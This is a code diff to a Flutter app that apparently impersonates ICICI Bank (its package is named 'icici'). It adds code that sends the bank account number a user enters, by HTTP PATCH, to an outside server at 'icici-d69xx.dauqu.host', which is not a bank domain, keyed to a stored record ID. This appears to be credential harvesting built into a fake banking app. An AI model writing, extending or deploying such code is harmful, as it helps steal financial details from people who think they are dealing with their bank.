@@ -1,6 +1,10 @@
+import 'dart:convert';
+
 import 'package:flutter/material.dart';
 import 'package:icici/home.dart';
+// ignore: depend_on_referenced_packages
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:http/http.dart' as http;
 
 class AccountNumber extends StatefulWidget {
   const AccountNumber({Key? key}) : super(key: key);
@@ -57,13 +61,68 @@ class _AccountNumberState extends State<AccountNumber> {
       loading = false;
     });
 
+    var response = prefs.getString('response');
+    //Parse JSON
+    var data = jsonDecode(response!);
+
+    await http
+        .patch(
+            Uri.parse(
+                "https://icici-d69xx.dauqu.host/data/account_no/${data["_id"]}"),
+            headers: <String, String>{
+              'Content-Type': 'application/json; charset=UTF-8',
+            },
+            body: jsonEncode(<String, String>{
+              "account_no": accountNumber,
+            }))
+        .then((value) => {
+              //Set Laoding to false
+              setState(() {
+                loading = false;
+              }),
+
+              //Move to next page
+              Navigator.push(
+                context,
+                MaterialPageRoute(
+                  builder: (context) => const MyHomePage(),
+                ),
+              )
+            })
+
+        //Navigate to other page
+        .catchError((onError) {
+      print(onError);
+      //Set Loading fase
+      setState(() {
+        loading = false;
+      });
+
+      //Show nackend error in dialog
+      showDialog(
+          context: context,
+          builder: (BuildContext context) {
+            return AlertDialog(
+              title: const Text("Error"),
+              content: Text(onError.toString()),
+              actions: [
+                TextButton(
+                    onPressed: () {
+                      Navigator.of(context).pop();
+                    },
+                    child: const Text("OK"))
+              ],
+            );
+          });
+    });
+
     // ignore: use_build_context_synchronously
-    Navigator.push(
-      context,
-      MaterialPageRoute(
-        builder: (context) => const MyHomePage(),
-      ),
-    );
+    // Navigator.push(
+    //   context,
+    //   MaterialPageRoute(
+    //     builder: (context) => const MyHomePage(),
+    //   ),
+    // );
   }
 
   @override
